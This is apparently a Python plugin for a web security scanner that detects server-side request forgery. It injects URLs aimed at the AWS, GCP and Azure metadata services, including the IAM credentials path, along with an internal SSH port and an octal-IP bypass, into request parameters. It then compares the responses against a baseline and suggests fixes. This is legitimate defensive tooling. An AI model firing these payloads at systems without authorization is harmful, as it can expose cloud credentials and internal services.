"""
Server-Side Request Forgery (SSRF) detection — with baseline comparison.
Only flags when internal/metadata content appears AFTER injection, not in baseline.
"""
from __future__ import annotations
import re
import json
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from ..base_plugin import BasePlugin, ScanTarget, RawFinding

SSRF_PAYLOADS = [
    # AWS metadata
    ("http://169.254.169.254/latest/meta-data/", [r"ami-id", r"instance-id", r"local-hostname"], "AWS EC2 Metadata"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", [r"AccessKeyId", r"SecretAccessKey"], "AWS IAM Credentials"),
    # GCP metadata
    ("http://metadata.google.internal/computeMetadata/v1/", [r"project-id", r"zone"], "GCP Metadata"),
    # Azure metadata
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", [r"vmId", r"subscriptionId"], "Azure IMDS"),
    # Internal services
    ("http://127.0.0.1:22/", [r"SSH-\d"], "Internal SSH Service"),
    # Bypass attempts
    ("http://0177.0.0.1/", [r"<html.*>.*<title>"], "Octal IP Bypass"),
]

# Parameters commonly used for SSRF
SSRF_PARAMS = {"url", "uri", "path", "link", "src", "source", "redirect", "target", "fetch", "proxy", "callback", "webhook", "endpoint", "api", "host", "domain", "dest", "destination"}


class SSRFPlugin(BasePlugin):
    name = "SSRF Scanner"
    vuln_type = "ssrf"

    async def scan(self, target: ScanTarget) -> list[RawFinding]:
        findings: list[RawFinding] = []
        test_params = [(p, "query") for p in target.parameters]
        test_params += [(f["name"], "form") for f in target.form_fields if f.get("name")]

        # Prioritize URL-like parameters
        test_params.sort(key=lambda x: 0 if x[0].lower() in SSRF_PARAMS else 1)

        for param, source in test_params:
            # Baseline
            baseline = await self._inject(target, param, "https://example.com", source)
            if baseline is None:
                continue

            for payload_url, detect_patterns, service_name in SSRF_PAYLOADS:
                resp = await self._inject(target, param, payload_url, source)
                if resp is None:
                    continue

                for pattern in detect_patterns:
                    # Must NOT exist in baseline
                    if re.search(pattern, baseline.text, re.IGNORECASE):
                        continue
                    match = re.search(pattern, resp.text, re.IGNORECASE)
                    if not match:
                        continue

                    # Verification
                    verify = await self._inject(target, param, payload_url, source)
                    if verify is None or not re.search(pattern, verify.text, re.IGNORECASE):
                        continue

                    evidence = resp.text[max(0, match.start() - 30):match.end() + 50]
                    findings.append(RawFinding(
                        vuln_type="ssrf",
                        title=f"Server-Side Request Forgery ({service_name})",
                        description=(
                            f"The parameter '{param}' allows making HTTP requests from the server. "
                            f"Successfully accessed {service_name} ({payload_url}). Content was NOT "
                            f"present in baseline response. Verified with repeated request."
                        ),
                        affected_url=target.url, severity="HIGH",
                        affected_parameter=param, injection_point=source, payload=payload_url,
                        request_evidence=f"{source.upper()} '{param}' = {payload_url}",
                        response_evidence=evidence.strip()[:200],
                        remediation=(
                            "Validate and sanitize all user-supplied URLs. Use allowlists for permitted domains. "
                            "Block requests to internal/private IP ranges."
                        ),
                        remediation_code=json.dumps({
                            "vulnerableCode": "requests.get(user_input_url)",
                            "remediatedCode": "# Validate URL against allowlist\\nimport ipaddress, socket\\nip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))\\nif ip.is_private: raise ValueError('Blocked')",
                            "explanation": "DNS resolution + private IP check prevents SSRF to internal services.",
                            "language": "Python",
                        }),
                        confidence=90, verified=True,
                        business_impact=f"Access to {service_name}. May expose cloud credentials or internal services.",
                    ))
                    break
                else:
                    continue
                break
        return findings

    async def _inject(self, target, param, payload, source):
        if source == "query":
            parsed = urlparse(target.url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [payload]
            url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
            return await self._send_request(url, headers=target.headers, cookies=target.cookies)
        else:
            data = {f["name"]: f.get("value", "") for f in target.form_fields}
            data[param] = payload
            return await self._send_request(target.url, method="POST", data=data, headers=target.headers, cookies=target.cookies)
